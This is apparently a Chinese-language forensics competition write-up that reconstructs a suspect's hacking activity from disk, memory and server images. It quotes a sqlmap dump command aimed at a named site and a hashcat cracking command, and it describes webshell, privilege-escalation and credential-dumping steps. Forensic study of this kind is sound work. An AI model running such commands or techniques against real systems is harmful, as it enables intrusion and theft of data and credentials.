![Pasted image 20250413135906.png](./attachments/Pasted%20image%2020250413135906.png)

但问题在于, 这个地址在兼容链也有信息, 并且全部都有交易记录:

![Pasted image 20250413132307.png](./attachments/Pasted%20image%2020250413132307.png)


### 3.钱包地址接受用户资金使用的虚拟币币种是

> ==BNB==
> 

账户余额是 BNB.


### 4.已知地址 0xd109046aa3e92d13fad241a695262be4ec3431f6 曾收到上述地址涉案资金并将这笔资金后续跨链转出, 跨链资金直接转出到哪条链

> ==BUSD-T Stablecoin==
> 

[Address 0xd109046aa3e92d13fad241a695262be4ec3431f6 | BscScan](https://bscscan.com/address/0xd109046aa3e92d13fad241a695262be4ec3431f6)

![Pasted image 20250413140046.png](./attachments/Pasted%20image%2020250413140046.png)

![Pasted image 20250413140125.png](./attachments/Pasted%20image%2020250413140125.png)

转出 2 次, 通过智能合约转到 USDT(`BUSD-T Stablecoin`):

![Pasted image 20250413140204.png](./attachments/Pasted%20image%2020250413140204.png)


### 5.根据上题, 确定项目的沉淀地址是

> ==0x7D958b37C2C8fd88d4d9ebF15823c51B973ce274==
> 

沉淀地址应该是通过合约转到 USDT 的地址


---

## 计算机取证 

### 1.计算机共通过 localsend 应用接收了多少个视频文件

> ==69==
> 

全盘搜索 localsend 找到配置存储文件 `PC.E01/System/Users/Administrator/AppData/Roaming/org.localsend/localsend_app/shared_preferences.json`. 大概浏览一下, 接收文件里面除了 mp4 就是 jpg.

![Pasted image 20250410164645.png](./attachments/Pasted%20image%2020250410164645.png)


### ﻿2.计算机共保存了多少个服务器的公钥

> ==35==
> 

第一反应是去 `.ssh` 里面找, 但 `%userdata%` 里没有. 全局搜索, 并没有找到.

桌面上有个 WindTerm 的快捷方式. ~~那不巧了吗, 我也用~~ 安装位置在 `PC.E01/Software/Program Files/WindTerm/WindTerm.exe`.

![Pasted image 20250410165045.png](./attachments/Pasted%20image%2020250410165045.png)

ssh 保存的服务器公钥在 `PC.E01/Software/Program Files/WindTerm/.wind/profiles/default.v10/terminal/ssh/known_hosts` 中. 其实一开始想的差不多, 如果全局搜索的是 `known_hosts` 的话就直接搜到了, 毕竟 `.ssh` 的目录是用户可以修改的, 但是 `known_hosts` 的文件名是不能修改的.

![Pasted image 20250410165615.png](./attachments/Pasted%20image%2020250410165615.png)


### 3.计算机的 rustdesk 的中继服务器 IP 地址是什么

> ==152.126.118.24==
> 

全局搜索 `rustdesk`, 找到 5 个非空目录:

![Pasted image 20250410165753.png](./attachments/Pasted%20image%2020250410165753.png)

在 ` PC.E01/System/Users/Administrator/AppData/Roaming/RustDesk/` 保存着配置文件. 在 `RustDesk2.toml` 中保存着中继节点的信息:

![Pasted image 20250410170020.png](./attachments/Pasted%20image%2020250410170020.png)


### 4.计算机的 TOR 浏览器记录第⼀个有 cookie 的暗网地址是

> ==666666666tjjjeweu5iikuj7hkpke5phvdylcless7g4dn6vma2xxcad.onion==
> 

![Pasted image 20250410170130.png](./attachments/Pasted%20image%2020250410170130.png)


### 5.计算机里共群控过多少个终端

> ==4==
> 

桌面上有个来喜投屏:

![Pasted image 20250410180858.png](./attachments/Pasted%20image%2020250410180858.png)

再次全局搜索:

![Pasted image 20250410181035.png](./attachments/Pasted%20image%2020250410181035.png)

在数据库 `laixi.db` 中看到 4 个设备:

![Pasted image 20250410181112.png](./attachments/Pasted%20image%2020250410181112.png)


### 6.吴某未被起获的另⼀部手机的真实型号

> ==SM-F9460==
> 

检材中的安卓手机型号为 `SM-G996N`:

![Pasted image 20250410181225.png](./attachments/Pasted%20image%2020250410181225.png)

另外一部未取证的设备应该是 `SM-F9460`, 在电脑的 USB 设备记录中可以看到其商品名称为 `Galaxy Z Fold5`:

![Pasted image 20250410181400.png](./attachments/Pasted%20image%2020250410181400.png)


### 7.计算机群控程序脚本中哪个是吴某⾃⼰写的, 文件名 

> ==录屏存相册.bat==
> 

可以在 `laixi.db` 中看到 2 个脚本的信息, 存储位置都在 `C:\Program Files\Laixi\Scripts\` 中:

![Pasted image 20250410181554.png](./attachments/Pasted%20image%2020250410181554.png)

定位到文件夹, 发现目录中有 3 个脚本:

![Pasted image 20250410182611.png](./attachments/Pasted%20image%2020250410182611.png)

脚本 `自动上滑脚本.js` 中有应用网址 `www.laixi.app`, 应该是自带的样例脚本. 

![Pasted image 20250410182018.png](./attachments/Pasted%20image%2020250410182018.png)

脚本 `截图存相册.bat` 中文件命名也与应用名称有关.


### 8.计算机群控程序中滑屏脚本最大滑屏次数

> ==10000==
> 

循环里 9999 次, 循坏外 1 次:

![Pasted image 20250410182934.png](./attachments/Pasted%20image%2020250410182934.png)


### ﻿9.计算机中 adb 程序环境变量目录

> ==D:\PentestTools\reverse\platform-tools_r31.0.2-windows\platform-tools==
> 

计算机里一堆 adb, 得看 PATH 了. 查看注册表中保存的环境变量:

![Pasted image 20250410183502.png](./attachments/Pasted%20image%2020250410183502.png)

简单整理一下, 看到 PATH 中包含 `D:\PentestTools\reverse\platform-tools_r31.0.2-windows\platform-tools`:

![Pasted image 20250410183741.png](./attachments/Pasted%20image%2020250410183741.png)


### 10.微信聊天中的虚拟钱包地址

> ==11Bm4ZDrY6ughusdtXcXn4fxPErNhFG6G==
> 

电脑上的微信需要解密, 可以从内存镜像中提取解密密钥:

![Pasted image 20250410190058.png](./attachments/Pasted%20image%2020250410190058.png)

拿到密钥是"  
d3725593110248a581ed14312b5e39024acc4c8d93eb439ba4a4731ceca2f83c"

解密后可以看到自己发给自己的消息记录:

![Pasted image 20250410201112.png](./attachments/Pasted%20image%2020250410201112.png)


### 11.容器程序 main 函数地址

> ==00000001400010E0==
> 

可以在桌面上找到容器 `fortress`.

一开始一直以为容器程序是 VeraCrypt, 找了半天根本找不到. 然后在桌面上看到了内存分析部分提到的 `别点我.exe` 还真在电脑上运行过 2 次:

![Pasted image 20250410184514.png](./attachments/Pasted%20image%2020250410184514.png)

DIE 查一下:

![Pasted image 20250410185202.png](./attachments/Pasted%20image%2020250410185202.png)

IDA 启动.

![Pasted image 20250410185536.png](./attachments/Pasted%20image%2020250410185536.png)

在 `main` 函数里面, 看到与 ImDisk (镜像挂载工具)有关的字符串:

![Pasted image 20250410200145.png](./attachments/Pasted%20image%2020250410200145.png)

跳转到 `sub_140008D74`, 看到调用了 `cmd.exe`:

![Pasted image 20250410200306.png](./attachments/Pasted%20image%2020250410200306.png)

所以程序的作用大概就是调用 cmd 执行 ImDisk 的指令, 挂载镜像. ImDisk 不支持镜像加密, 因此也不用找密码了.

可以将镜像导出并挂载到电脑上, 或者直接添加为新检材. 镜像中的文件内容:

![Pasted image 20250410200555.png](./attachments/Pasted%20image%2020250410200555.png)

Excel 文件都有密码.


### 12.容器程序导入函数总数

> ==81==
> 

DIE 里面就能看到:

![Pasted image 20250410185721.png](./attachments/Pasted%20image%2020250410185721.png)


### 13.共对多少个网站进行过 SQL 注入的漏洞尝试

> ==17==
> 

在 `PC.E01/Software/PentestTools/ExploitationTools/SQL Injection` 目录下放着几个 SQL 注入用的工具:

![Pasted image 20250411094931.png](./attachments/Pasted%20image%2020250411094931.png)

`Advanced-SQL-Injection-Cheatsheet` 和 `SQL-Injection-Payload-List` 中是 Payload, 剩下的 4 个是工具.

`SuperSQLInjection` 的日志在 `logs` 目录中, 看来没有成功运行.

`JSQL-injection` , `NoSQLMap` 和 `sqlmap` 文件夹中都没有看到输出或者日志文件.

在 `%ADDPATA%` 目录中可以找到 sqlmap 的数据目录 `PC.E01/System/Users/Administrator/AppData/Local/sqlmap`, 其中包含了 `history` 和 `output` 文件夹.

`history\sql.hst` 中记录了运行过的 sql 命令, `output` 中则是依站点存储的攻击结果.

![Pasted image 20250411095834.png](./attachments/Pasted%20image%2020250411095834.png)

`output` 中共有 17 个文件夹.


### 14.通过 SQL 注入成功获取了⼀个网站的大部分数据, 存在注入漏洞的参数

> ==c_usd==
> 

在 `output` 目录中文件全显, 可以看到几个 csv 文件, 为 sqlmap 输出的获取到的数据:

![Pasted image 20250411100050.png](./attachments/Pasted%20image%2020250411100050.png)

跳转到原始目录在 `PC.E01/System/Users/Administrator/AppData/Local/sqlmap/output/gg.aigua666.com/`. 在 `target.txt` 中可以看到执行攻击时使用的命令行参数:

`http://gg.aigua666.com:80/index.php/wode/wode (GET)  # sqlmap.py -r 1.txt --batch -D gg_aigua666_com -T user_tixian --dump-all`

在 `log` 中可以看到运行 sqlmap 时的控制台输出, 其中关于开始攻击的部分:

![Pasted image 20250411100716.png](./attachments/Pasted%20image%2020250411100716.png)

sqlmap 给出了 2 种攻击方案, 注入参数都是 Cookie 中的 `c_usd` 字段, 方案分别是布尔盲注和报错注入.


### 15.接上题, 吴某攻击的网站管理员的登录 IP

> ==36.142.187.31==
> 

在日志中可以看到攻击的全流程:

1. 获取了数据库的用户名:

![Pasted image 20250411101017.png](./attachments/Pasted%20image%2020250411101017.png)

2. 获取了所有数据库名:

![Pasted image 20250411101111.png](./attachments/Pasted%20image%2020250411101111.png)

3. 获取了数据库 `gg_aigua666_com` 中所有表名:

![Pasted image 20250411101141.png](./attachments/Pasted%20image%2020250411101141.png)

4. 获取了 `manager` 表中的内容:

![Pasted image 20250411101224.png](./attachments/Pasted%20image%2020250411101224.png)

5. 查看了 `user` 表中的记录数量:

![Pasted image 20250411101345.png](./attachments/Pasted%20image%2020250411101345.png)

6. 之后 dump 了所有表的数据:

![Pasted image 20250411101423.png](./attachments/Pasted%20image%2020250411101423.png)

管理员的登录 IP 在 `manager` 表中.


### 16.电脑上共连接过多少个 webshell

> ==14==
> 

`PC.E01/Software/PentestTools/Webshell` 目录中有 webshell 管理工具:

![Pasted image 20250411101650.png](./attachments/Pasted%20image%2020250411101650.png)

冰蝎 `Behinder`, 天蝎 `SkyScorpion`, 哥斯拉 `Godzilla` 的数据库中都没有已保存的 shell.

菜刀里面有几个 shell 但时间对不上, 应该是下载工具的时候数据库里面已经有的:

![Pasted image 20250411102034.png](./attachments/Pasted%20image%2020250411102034.png)

`Awesome-shells` 是 webshell 代码的收集, `PyShell` 和 `Weevely3` 是 webshell 生成工具.

蚁剑 `AntSword` 的数据保存在 `AntSword/antSword-master/antData/db.ant` 目录下, 其实是一行一条的 JSON 文件, 有 13 行:

![Pasted image 20250411102833.png](./attachments/Pasted%20image%2020250411102833.png)

但根据最近访问的项目中, 又存在另外一个目录中有冰蝎:

![Pasted image 20250411103707.png](./attachments/Pasted%20image%2020250411103707.png)

跳转到原始目录, 发现这里似乎是另外一个渗透测试常用的工具包, 在 ` PC.E01/Software/PentestTools/framvuln/GUI_Tools_3/gui_webshell` 又有蚁剑, 2 个版本不同的冰蝎, 哥斯拉和天蝎:

![Pasted image 20250411104302.png](./attachments/Pasted%20image%2020250411104302.png)

在 4.0.6 版本的冰蝎的数据库中发现了 1 个保存的 webshell 信息:

![Pasted image 20250411104545.png](./attachments/Pasted%20image%2020250411104545.png)

时间也对的上:

![Pasted image 20250411104703.png](./attachments/Pasted%20image%2020250411104703.png)


### 17.电脑上常用的蚁剑共安装了多少个插件

> ==27==
> 

常用的蚁剑是哪个可以根据程序运行记录来判断:

![Pasted image 20250411103817.png](./attachments/Pasted%20image%2020250411103817.png)

再者, 其实 `PC.E01/Software/PentestTools/framvuln/GUI_Tools_3/gui_webshell/AntSword.app/` 是包含为 MacOS 编译的 Electron GUI 的蚁剑, 一般也不会在 Windows 上直接运行 CLI.

在 `AntSword/antSword-master/antData/plugins` 目录中:

![Pasted image 20250411103316.png](./attachments/Pasted%20image%2020250411103316.png)

这道题其实对上题也有提示, 电脑中不止一个蚁剑.


### 18.电脑上常用的蚁剑做了改造, 改造后的 User-agent

> ==require('random-fake-useragent')==
> 

蚁剑的默认 UA 是 `antSword/vX.X`, 修改默认 UA 需要修改 `AntSword/antSword-master/modules/request.js` 文件中对 UA 的赋值语句:

![Pasted image 20250411105456.png](./attachments/Pasted%20image%2020250411105456.png)

这里可以看到, 默认 UA 已经被修改为从 `random-fake-useragent` 获取了. 没有相对路径的 require 是从项目的 node_module 中加载代码, 找到 `random-fake-useragent` 模块的文件:

![Pasted image 20250411105704.png](./attachments/Pasted%20image%2020250411105704.png)

读一下源码, 就是随机从 `useragents.json` 中取 1 个 UA 出来.


### 19.吴某在后⻔为 `con.php` 的 webshell 上查询到 `/www/wwwroot/default/` 目录下有多少个 php

> ==434==
> 

在蚁剑存储的 webshell 数据库中可以找到题目中提到的 webshell:

![Pasted image 20250411111639.png](./attachments/Pasted%20image%2020250411111639.png)

看到 `id` 为 `KU2ILCtSjIr77dcv`.  可以在蚁剑的缓存目录 `AntSword\antSword-master\antData\cache` 中找到对应的缓存文件 `KU2ILCtSjIr77dcv`:

![Pasted image 20250411111758.png](./attachments/Pasted%20image%2020250411111758.png)

还是个 JSON 文件, 但是是嵌套了 dump 后的 JSON 对象的 JSON 文件, 用 Python 加载一下. 注意到每个 JSON 对象中 `tag` 的最后一段似乎是 Base64 编码, 对最后一段进行解码:

![Pasted image 20250411112834.png](./attachments/Pasted%20image%2020250411112834.png)

![Pasted image 20250411112948.png](./attachments/Pasted%20image%2020250411112948.png)

`/www/wwwroot/default/` 目录是第 4 个 JSON 对象. 

![Pasted image 20250411113152.png](./attachments/Pasted%20image%2020250411113152.png)

统计一下文件名末尾为 `.php` 的文件数量:

![Pasted image 20250411113331.png](./attachments/Pasted%20image%2020250411113331.png)


### ﻿20.吴某通过手机 kali 渗透后拿到⼀个 webshell, 使用电脑进行管理, 这个 webshell 主机的计算机名

> ==IZTYQTRFU20DWUZ==
> 

本题逻辑上衔接在"Andriod 手机"部分的第 17 题之后.

在冰蝎的目录 `PC.E01\Software\PentestTools\framvuln\GUI_Tools_3\gui_webshell\Behinder_v4.0.6\offline` 中存储了 WebShell 指令请求结果的离线副本.

可以在 `getBasicInfo.json` 中看到指令的执行结果:

![Pasted image 20250411124907.png](./attachments/Pasted%20image%2020250411124907.png)

Base64 解码后是一个 html 页面:

![Pasted image 20250411125031.png](./attachments/Pasted%20image%2020250411125031.png)


### 21.接上题, 这个 webshell 主机当前登录操作系统的用户名


![Pasted image 20250411125112.png](./attachments/Pasted%20image%2020250411125112.png)

用户名为 `aa`.


### 22.接上题, 这个 webshell 主机的数据库密码

> ==Asd123456!@#==
> 

在 `offline` 目录中的 `showFile.json` 中可以看到查看了 `Web.config` 文件, 其中包含网络服务器的配置信息:

![Pasted image 20250411125858.png](./attachments/Pasted%20image%2020250411125858.png)

对 result 中的 msg 进行 base64 解码, 得到的是一个 xml 文件. 其中记录了数据库配置信息:

![Pasted image 20250411130821.png](./attachments/Pasted%20image%2020250411130821.png)


### 23.接上题, 吴某成功提权使用到的工具名

> ==SweetPotato==
> 

在 `offline` 目录中的 `runCommand.json` 中可以看到通过 WebShell 执行的指令.

![Pasted image 20250411131229.png](./attachments/Pasted%20image%2020250411131229.png)

![Pasted image 20250411131448.png](./attachments/Pasted%20image%2020250411131448.png)

可以看到以下关键信息:

网站根目录被上传了一堆提权工具.

![Pasted image 20250411131526.png](./attachments/Pasted%20image%2020250411131526.png)

提权前用户组和用户名为 `iis apppool\aa`.

![Pasted image 20250411131543.png](./attachments/Pasted%20image%2020250411131543.png)

系统信息:

![Pasted image 20250411131653.png](./attachments/Pasted%20image%2020250411131653.png)

使用 `SweetPotato` 提权成功, 获取了 `SYSTEM` 权限的 cmd:

![Pasted image 20250411131734.png](./attachments/Pasted%20image%2020250411131734.png)


### 24.吴某在电脑上使用 Cobalt Strike 生成了⼀个木马, 该木马的 MD5 值

> ==f3ca69fa60bea34883da3274fd9603f9==
> 

电脑上又找到了一堆 `Cobalt Strike`:

![Pasted image 20250411132433.png](./attachments/Pasted%20image%2020250411132433.png)

桌面上有一个 CS 的快捷方式, 指向的是 `D:\PentestTools\ExploitationTools\Exploit Framework\CobaltStrike4.4` 中的 CS.

但是生成的被控端不在 CS 的目录下, 懒得找了, 直接杀毒软件启动:

![Pasted image 20250411133123.png](./attachments/Pasted%20image%2020250411133123.png)

找到了, 在 Resource Hacker 的文件夹里, 图标被修改成微信了:

![Pasted image 20250411133232.png](./attachments/Pasted%20image%2020250411133232.png)

![Pasted image 20250411133315.png](./attachments/Pasted%20image%2020250411133315.png)


### 25.吴某在电脑上进行了内网渗透, Socks5 协议跳板代理服务器的 IP 以及端口

> ==57.233.98.29:37761==
> 

电脑上有一堆代理工具. 桌面上有个 Proxifier, 根据之前的经验, 从桌面上找应该没错, 安装在 `PC.E01/Software/Proxifier`, 数据目录在 `%APPDATA%` 里面.

![Pasted image 20250411133741.png](./attachments/Pasted%20image%2020250411133741.png)

`\PC.E01\System\Users\Administrator\AppData\Roaming\Proxifier4\Profiles\Default.ppx` 是默认配置, 如果电脑上装有 Proxifier 的话可以直接导入:

![Pasted image 20250411134026.png](./attachments/Pasted%20image%2020250411134026.png)

或者看文件内容:

![Pasted image 20250411134049.png](./attachments/Pasted%20image%2020250411134049.png)


### ﻿26.吴某在对目标进行信息收集时发现了⼀些 Webpack 等前端打包工具所构造的网站, 使用特定工具对其进行信息收集, 该工具共输出多少个网站的报告

> ==5==
> 

全盘搜索 Webpack, 可以看到搜索结果集中在 2 个路径中:

![Pasted image 20250411141747.png](./attachments/Pasted%20image%2020250411141747.png)

但都在 `node_modules` 目录下, 都是程序使用的 NodeJS 模块, 与题目无关.

在 D 盘的渗透测试工具包里看到有 `Packer-Fuzzer`, 是用来收集前端打包信息的工具:

![Pasted image 20250411142136.png](./attachments/Pasted%20image%2020250411142136.png)

在最近访问的项目中也可以看到用户访问了 `report` 目录下的文件:

![Pasted image 20250411142415.png](./attachments/Pasted%20image%2020250411142415.png)

可以看到一共生成了 5 个站点的报告:

![Pasted image 20250411142555.png](./attachments/Pasted%20image%2020250411142555.png)


### 27.吴某使用远程登录工具登录了⼀台远程 Windows 主机, 其 IP 地址

> ==206.238.220.147==
> 

电脑上安装有 `PRemoteM`, 在应用程序目录 `\PC.E01\Software\PentestTools\Network\PRemoteM_2` 中的数据库 `PRemoteM.db` 中存储有远程主机的配置信息:

![Pasted image 20250411142727.png](./attachments/Pasted%20image%2020250411142727.png)


### 28.吴某拖回了某台机器的 `lsass` 进程的内存, 该机器的开机密码

> ==uiLbnts7pQsC==
> 

`lsass.exe` 是 Windows 平台用于管理用户认证等功能的组件. 可以由 CS 获取, 但从内存中提取密钥需要使用 `Mimiktz`.

全盘搜索后, 找到 `Mimikatz` 的二进制文件:

![Pasted image 20250411143448.png](./attachments/Pasted%20image%2020250411143448.png)

在 `PC.E01/Software/PentestTools/framvuln/mimikatz_trunk/x64` 目录下找到了被 dump 出来的内存映像 `mm.dmp`:

![Pasted image 20250411143538.png](./attachments/Pasted%20image%2020250411143538.png)

导出后用自己电脑里的 `Mimikatz` 跑一下.

![Pasted image 20250411144417.png](./attachments/Pasted%20image%2020250411144417.png)

![Pasted image 20250411144511.png](./attachments/Pasted%20image%2020250411144511.png)


### KeePass 解密

查看一下 KeePass 的版本 >= 2.54, 没有内存泄漏的 BUG, 不用考虑内存提取了.

![Pasted image 20250411110833.png](./attachments/Pasted%20image%2020250411110833.png)

试着用 HashCat 爆 KeePass 的密钥, 6 位以下数字和 1w6 的弱口令没爆出来. 最后从内存里提取了长度在 6 至 32 的字符串, 用来当字典爆破, 也没爆出来.

在 Enigma 的聊天记录中看到关于讨论 Excel 文件密码的消息, 但连接早就失效了. 连接有效期只有 24 小时, 所以当时打比赛的时候也已经过期了. 这个平台能上传的是文件, 所以考虑到会不会电脑上保存着当时上传的文件, 但也没找到.

![Pasted image 20250411161133.png](./attachments/Pasted%20image%2020250411161133.png)

也是爆破了 6 位以下数字, 没有找到密码. 由于没有给出密码格式的提示, 不可能是要爆破的. 

暂时放弃了. 如果有看到这里的师傅找到了 Excel 文件的密码, 请[邮箱](mailto://noahtie@foxmail.com)联系我! 

### 29.户籍是⿊⻰江省的受害人总数

Excel 文件位于第 11 题提及到的容器 `fortress` 里面. 因为没有找到 Excel 文件的密码, 这部分题目都无法完成.

### 30.受害人住址地跟户籍地不在⼀个省份的总数


### 31.受害人年纪在 25 岁以下和 60 岁以上总数是(以比赛当天 2024 年 6 月 6 日为准)


### 32.住址在四川的受害人余额总计


### 33.男性受害人总数


### 34.注册时间在 2024 年 1 ⽉ 1 号到 2024 年 4 ⽉ 1 号的受害人总数


---

## 内存分析

### 1.给出进程"别点我.exe"的进程 ID

> ==2872==
> 

vol3 的 `windows.pslist` 插件:

![Pasted image 20250410175526.png](./attachments/Pasted%20image%2020250410175526.png)

输出有一个进程名是乱码, 是题目中提到的进程:

![Pasted image 20250410175719.png](./attachments/Pasted%20image%2020250410175719.png)


### 2.FTK Imager的程序版本号

> ==4.7.1.2==
> 

FTK Imager 的 PID 是 11988:

![Pasted image 20250411145012.png](./attachments/Pasted%20image%2020250411145012.png)

用 vol3 的 `windows.pslist` 插件导出 FTK Imager 的文件:

![Pasted image 20250411150644.png](./attachments/Pasted%20image%2020250411150644.png)


### 3.给出向日葵使用时, 计算机内网的 IP 地址

> ==192.168.217.172==
> 

用 vol3 的 `windows.netscan` 插件查看进程的网络状态:

![Pasted image 20250411153328.png](./attachments/Pasted%20image%2020250411153328.png)


## VPN 服务器

> 参考 `VPN.E01`.
> 

仿真起来, 看看网络配置信息和 ssh 端口:

![Pasted image 20250412103537.png](./attachments/Pasted%20image%2020250412103537.png)

连上之后在 `root` 目录发现有国际版宝塔面板的安装脚本. 

`bt 14` 获取宝塔面板信息:

![Pasted image 20250412104626.png](./attachments/Pasted%20image%2020250412104626.png)

`bt 5` 修改面板密码:

![Pasted image 20250412104818.png](./attachments/Pasted%20image%2020250412104818.png)

登陆面板, 看到运行着 2 个 PHP 站点:

![Pasted image 20250412104931.png](./attachments/Pasted%20image%2020250412104931.png)

查看 Nginx 的站点 URL 配置:

![Pasted image 20250412105036.png](./attachments/Pasted%20image%2020250412105036.png)

![Pasted image 20250412105045.png](./attachments/Pasted%20image%2020250412105045.png)


### ﻿1.网站 `http://192.168.11.89` 在网站根目录存在源码泄露的位置

> ==www.zip==
> 

在 `/home` 目录中看到有渗透测试工具:

![Pasted image 20250412105403.png](./attachments/Pasted%20image%2020250412105403.png)

在 `dirsearch` 的目录中看到扫描报告, 其中包含对题目中网址的扫描报告:

![Pasted image 20250412105524.png](./attachments/Pasted%20image%2020250412105524.png)

查看报告内容, 在 `_manage__24-05-21_07-05-15.txt` 中搜索 `200`, 发现网站目录中存在源码压缩包 `www.zip`.

![Pasted image 20250412105813.png](./attachments/Pasted%20image%2020250412105813.png)


### 2.在网站根目录存在源码泄露的网站

> ==192.168.11.5==
> 

直接在报告文件夹里全局搜索 `200`. 

在 `http_192.168.11.5/_24-05-21_07-53-18.txt` 中看到存在目录穿越. 包含网站源码备份 `www.zip`.


### 3.⿊客使用 os-shell 写入文件上传内容的文件名

> ==tmpbitns.php==
> 

`os-shell` 是 sqlmap 的功能, `/home` 目录下就有 sqlmap, 去看看.

在 sqlmap 目录下看到了 2 个原本不属于 sqlmap 的文件:

![Pasted image 20250412111353.png](./attachments/Pasted%20image%2020250412111353.png)

在 `1.txt` 中看到了攻击时的请求:

![Pasted image 20250412111221.png](./attachments/Pasted%20image%2020250412111221.png)

在 `touzlic` 文件夹中存储的完整日志中可以看到攻击者通过报错注入得到了数据库名(`touzi`), 数据库管理员用户名(`touzi1.txt` & `touzi2.txt`), 并且上传了 webshell(`touzilic3.txt`).

上传文件 `tmpumqvm.php` 的部分:

![Pasted image 20250412113305.png](./attachments/Pasted%20image%2020250412113305.png)

作用是将 16 进制串解码为文件, 存储为 `c:/phpstuty/www/tmpumsoo.php`, 上传文件的内容:

![Pasted image 20250412113339.png](./attachments/Pasted%20image%2020250412113339.png)

文件的作用是一个不受 php 上传目录限制的文件上传页面, 可以将文件上传到非上传目录中. 接着利用该文件上传了 webshell:

![Pasted image 20250412113704.png](./attachments/Pasted%20image%2020250412113704.png)

上述过程为 sqlmap 执行 os-shell 时的操作, 最终实际获得的 webshell 是 `tmpbitns.php`.


### 4.正在使用的 XSS 平台用 IP 运行的端口

> ==192.168.11.188==
> 

服务器上运行的网站 `website.com` 就是 XSS 平台, 网站根目录中的 `README.md` 是平台的使用说明.

查看 Nginx 的配置信息就能看到 IP 地址.


### 5.正在使用的 XSS 平台的管理员密码

> ==admin123==
> 

查看数据库内容, 在数据库 `website` 中的表 `oc_user` 中存储着用户信息, 包含用户名和密码的哈希.

哈希为 `5f66a846c5b983b16eb09c3c393b5d9e`, 在 cmd5 能查询到, 但是条付费记录. 既然能查到, 说明大概率是个弱口令. 

在平台的源代码里可以看到平台是基于 OldCMS 开发的, 在 `source/function.php` 中可以看到使用的哈希函数为 `md5('OldCMS|'.pwd)`:

![Pasted image 20250412130425.png](./attachments/Pasted%20image%2020250412130425.png)

直接去 HashCat 跑弱口令字典爆一下: `hashcat.exe -m 0 -a 7 "5f66a846c5b983b16eb09c3c393b5d9e" "OldCMS|" .\dict\password-attacks\top6000.txt`

![Pasted image 20250412131308.png](./attachments/Pasted%20image%2020250412131308.png)


### 6.正在使用的 XSS 平台中接受到哪个网站的管理员的 cookie

> ==jinsha.abc==
> 

查看数据库内容, 在数据库 `website` 中的表 `oc_project_content` 中存储着获取到的 Cookie 信息:

![Pasted image 20250412120504.png](./attachments/Pasted%20image%2020250412120504.png)

重建服务需要修改几处配置:

- Nginx 配置
- 网站根目录中的 `config.php` 中的 IP 地址

之后在宝塔面板中重启 web 服务器即可.


### 7.获取到权限的目标机器的管理员 NTLM

> ==32ed87bdb5fdc5e9cba88547376818d4==
> 

在 `/home` 目录中也有 CobaltStrike, 查看其日志文件. 在 `beacon_837294754.log`:

![Pasted image 20250412122459.png](./attachments/Pasted%20image%2020250412122459.png)


### 8.从获取到权限的目标机器上下载了哪个文件

> ==config.php==
> 

接上题, 在 `downloads.log` 中:

![Pasted image 20250412122423.png](./attachments/Pasted%20image%2020250412122423.png)

可以看到从 `C:\Users\Administrator\Desktop\WWW\WWW\common\config\` 目录下载了 `config.php`.


### 9.在获取到权限的目标机器成功创建的用户名

> ==leon==
> 

在日志 `beacon_837294754.log` 中可以看到创建新用户并将其添加进管理员组的指令:

![Pasted image 20250412122950.png](./attachments/Pasted%20image%2020250412122950.png)

创建的用户名为 `leon` 且为隐藏用户.


### 10.代理软件登录的端口

> ==58294==
> 

查看系统运行的进程树:

![Pasted image 20250412123611.png](./attachments/Pasted%20image%2020250412123611.png)

发现有在运行 Sing-box 和 SUI.

查看 Sing-box 的服务信息:

![Pasted image 20250412123828.png](./attachments/Pasted%20image%2020250412123828.png)

查看 SUI 的服务信息:

![Pasted image 20250412124057.png](./attachments/Pasted%20image%2020250412124057.png)

可以看到 Sing-box 的代理端口是 tcp/udp 的 41369, SUI 的 web 服务运行在 58294 端口.

SUI 的配置信息存储在 `/usr/local/s-ui/db` 中.

![Pasted image 20250412124656.png](./attachments/Pasted%20image%2020250412124656.png)


### 11.代理软件中的代理端口

> ==41369==
> 

见上题.


### 12.这台机器中的 Cobalt Strike 服务端使用的端口

> ==59837==
> 

TeamServer 是 CS 的 CLI 程序, Cobalt Strike 是 CS 的 GUI 程序, 在服务器上启动需要直接运行 TeamServer.

启动一下看看：

![Pasted image 20250412135701.png](./attachments/Pasted%20image%2020250412135701.png)


---

## 网盘服务器

> 参考 `存储服务器\Server.dd`.
> 

服务器还是仿真起来.

还是需要修改一下 sshd 的配置, 把 ChallengeAuthentication 开启.

查看一下进程树, 发现有 Dockerd 和 Containerd 在运行, 服务器上应该有 Docker 容器在运行:

![Pasted image 20250412141328.png](./attachments/Pasted%20image%2020250412141328.png)

有几个容器在运行:

![Pasted image 20250412141359.png](./attachments/Pasted%20image%2020250412141359.png)

装个 `portainer` 看起来方便一点:

```bash
docker pull docker.m.daocloud.io/portainer/portainer-ce:latest
docker run -d \
    -p 8000:8000 \
    -p 9000:9000 \
    --name portainer \
    --restart=always \
    -v /var/run/docker.sock:/var/run/docker.sock \
    -v portainer_data:/data \
    docker.m.daocloud.io/portainer/portainer-ce

```

![Pasted image 20250412143203.png](./attachments/Pasted%20image%2020250412143203.png)

此外, 本机上还运行了一个 `Alist` 网盘服务, `Alist` 的运行状态:

![Pasted image 20250412150914.png](./attachments/Pasted%20image%2020250412150914.png)


### 1.吴某购买的 RackNerd 服务器的详情 ID

`it-tools` 容器内是一个导航页面, 映射到机器的 80 端口. 其中包含了一个到 RackNerd 控制台的链接, 根据连接中的参数, ID 应该为 ==331979==.

![Pasted image 20250412143302.png](./attachments/Pasted%20image%2020250412143302.png)


### 2.共有几个提供 web 服务的端口

> ==5==
> 

Docker 容器映射到本机的端口有 `5005`, `80`, `3001` 和 `5344`, 此外还有一个 `Alist` 使用的 ==5244== 端口.


### 3.admin 用户加密密码的盐值

> ==w4XKqQfHI89zdMXb==
> 

需要登录的网站之一运行在 Docker 容器 `uptime-kuma` 的服务, 找到容器挂载的卷, 位于 `/var/lib/docker/volumes/uptime-kuma`, 用户信息存储在 `kuma.db` 中, 密码哈希是 `$2a$10$A1uikR1M8trohKNRg24ojew8pl2WXi9Rq7NriLHHInB33RIoLAxYa`.

![Pasted image 20250412144818.png](./attachments/Pasted%20image%2020250412144818.png)

另外一个需要登录的网站是运行在本机上的 `Alist` 服务器, 程序目录为 `/opt/alist`. 其中的 `data` 文件夹中存储着数据库 `data.db`, 表 `x_users` 中记录着密码的哈希及 Salt:

![Pasted image 20250412151611.png](./attachments/Pasted%20image%2020250412151611.png)


### 4.服务器存活监控应用的 admin 用户密码

> ==admin888==
> 

服务器存活监控应用的 `uptime-kuma`, admin 用户的哈希是 `$2a$10$A1uikR1M8trohKNRg24ojew8pl2WXi9Rq7NriLHHInB33RIoLAxYa`, 其格式符合 bcrypt(`$2*$*$`), 尝试用 HashCat 爆破.

